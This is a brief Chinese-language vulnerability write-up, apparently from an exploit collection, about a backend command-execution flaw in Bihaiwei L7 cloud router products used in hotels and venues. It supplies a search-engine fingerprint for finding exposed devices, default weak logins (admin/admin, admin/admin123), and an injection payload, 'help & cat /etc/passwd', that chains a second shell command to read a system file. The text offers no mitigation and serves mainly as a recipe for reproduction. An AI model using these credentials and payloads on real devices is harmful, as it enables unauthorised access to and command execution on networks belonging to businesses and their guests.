# 碧海威 L7多款产品存在后台命令执行漏洞

# 一、漏洞简介
碧海威L7网络产品是为酒店、度假村、商场和车站等商用无线管理者独身订造的专用网络设备。设备具备路由、防火墙、流控、无线AC控制器、微信认证等多项功能。碧海威 L7多款产品存在后台命令执行漏洞

# 二、影响版本
+ 碧海威 L7云路由

# 三、资产测绘
```plain
product="碧海威科技-L7云路由"
```


# 四、漏洞复现
使用弱口令登录后台

```plain
admin/admin
admin/admin123
```


```plain
help & cat /etc/passwd 
```
